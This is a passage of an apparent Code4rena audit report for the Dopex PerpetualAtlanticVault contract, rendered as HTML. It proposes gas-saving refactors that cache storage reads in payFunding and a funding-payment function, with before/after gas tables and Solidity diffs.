id=\"g-9-we-can-cache-some-gas-intensive-operations\" style=\"position:relative;\"><a href=\"#g-9-we-can-cache-some-gas-intensive-operations\" aria-label=\"g 9 we can cache some gas intensive operations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-9] We can cache some gas intensive operations</h2>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L372-L396\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L372-L396</a></p>\n<h3 id=\"perpetualatlanticvaultsolpayfunding-cache-the-call-totalfundingforepochlatestfundingpaymentpointer-save-669-gas-on-average\" style=\"position:relative;\"><a href=\"#perpetualatlanticvaultsolpayfunding-cache-the-call-totalfundingforepochlatestfundingpaymentpointer-save-669-gas-on-average\" aria-label=\"perpetualatlanticvaultsolpayfunding cache the call totalfundingforepochlatestfundingpaymentpointer save 669 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PerpetualAtlanticVault.sol.payFunding(): Cache the call <code>totalFundingForEpoch[latestFundingPaymentPointer]</code> (Save 669 Gas on average)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>3578</td>\n<td>27125</td>\n<td>34705</td>\n<td>34705</td>\n</tr>\n<tr>\n<td>After</td>\n<td>3578</td>\n<td>26456</td>\n<td>33980</td>\n<td>33980</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">372</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payFunding</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RDPXV2CORE_ROLE</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">382</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">collateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">383</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">384</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">385</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">totalFundingForEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">386</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">387</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_updateFundingRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalFundingForEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">389</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PayFunding</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">390</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">391</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">totalFundingForEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">392</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">latestFundingPaymentPointer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">393</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">395</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalFundingForEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">396</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"142\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/perp-vault/PerpetualAtlanticVault.sol b/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 88ac2b3..16fb8a0 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -378,21 +378,22 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         fundingPaymentsAccountedFor[latestFundingPaymentPointer],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       6</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 _totalFundingForEpoch = totalFundingForEpoch[latestFundingPaymentPointer];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     collateralToken.safeTransferFrom(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       addresses.rdpxV2Core,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       address(this),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      totalFundingForEpoch[latestFundingPaymentPointer]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _totalFundingForEpoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _updateFundingRate(totalFundingForEpoch[latestFundingPaymentPointer]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _updateFundingRate(_totalFundingForEpoch);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit PayFunding(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       msg.sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      totalFundingForEpoch[latestFundingPaymentPointer],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _totalFundingForEpoch,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       latestFundingPaymentPointer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    return (totalFundingForEpoch[latestFundingPaymentPointer]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    return (_totalFundingForEpoch);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L502-L524\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L502-L524</a></p>\n<h3 id=\"we-can-cache-some-operations-instead-of-repeatedly-doing-them-save-490-gas-on-average\" style=\"position:relative;\"><a href=\"#we-can-cache-some-operations-instead-of-repeatedly-doing-them-save-490-gas-on-average\" aria-label=\"we can cache some operations instead of repeatedly doing them save 490 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>We can cache some operations instead of repeatedly doing them (Save 490 Gas on average)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>11472</td>\n<td>33743</td>\n<td>39946</td>\n<td>53946</td>\n</tr>\n<tr>\n<td>After</td>\n<td>10982</td>\n<td>33253</td>\n<td>39456</td>\n<td>53456</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">510</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">collateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">511</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">512</span><span class=\"mtk1\">:      (</span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">513</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">515</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">IPerpetualAtlanticVaultLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">).</span><span class=\"mtk11\">addProceeds</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">516</span><span class=\"mtk1\">:      (</span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">517</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">519</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FundingPaid</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">:      ((</span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">522</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">latestFundingPaymentPointer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">523</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">524</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"144\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 _amount = (currentFundingRate * (block.timestamp - startTime)) / 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     collateralToken.safeTransfer(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       addresses.perpetualAtlanticVaultLP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      (currentFundingRate * (block.timestamp - startTime)) / 1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addProceeds(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      (currentFundingRate * (block.timestamp - startTime)) / 1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit FundingPaid(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       msg.sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      ((currentFundingRate * (block.timestamp - startTime)) / 1e18),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       latestFundingPaymentPointer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L372-L396\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L372-L396</a></p>\n<h3 id=\"cache-latestfundingpaymentpointer-in-memory-save--291-gas\" style=\"position:relative;\"><a href=\"#cache-latestfundingpaymentpointer-in-memory-save--291-gas\" aria-label=\"cache latestfundingpaymentpointer in memory save  291 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>latestFundingPaymentPointer</code> in memory (Save  291 Gas)</h3>\n<p><strong>Not found by bot</strong></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>3578</td>\n<td>27125</td>\n<td>34705</td>\n<td>34705</td>\n</tr>\n<tr>\n<td>After</td>\n<td>3581</td>\n<td>26834</td>\n<td>34390</td>\n<td>34390</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">372</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payFunding</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RDPXV2CORE_ROLE</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">376</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">377</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">totalActiveOptions</span><span class=\"mtk1\"> ==</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">378</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">fundingPaymentsAccountedFor</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">379</span><span class=\"mtk1\">:      </span><span class=\"mtk7\">6</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">380</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">382</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">collateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">383</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">384</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">385</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">totalFundingForEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">386</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">387</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_updateFundingRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalFundingForEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">389</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PayFunding</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">390</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">391</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">totalFundingForEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">392</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">latestFundingPaymentPointer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">393</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">395</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalFundingForEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">396</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"146\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 _latestFundingPaymentPointer = latestFundingPaymentPointer;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _validate(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       totalActiveOptions ==</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        fundingPaymentsAccountedFor[latestFundingPaymentPointer],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        fundingPaymentsAccountedFor[_latestFundingPaymentPointer],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       6</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 __totalFundingForEpoch = totalFundingForEpoch[_latestFundingPaymentPointer];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     collateralToken.safeTransferFrom(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       addresses.rdpxV2Core,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       address(this),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      totalFundingForEpoch[latestFundingPaymentPointer]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      __totalFundingForEpoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 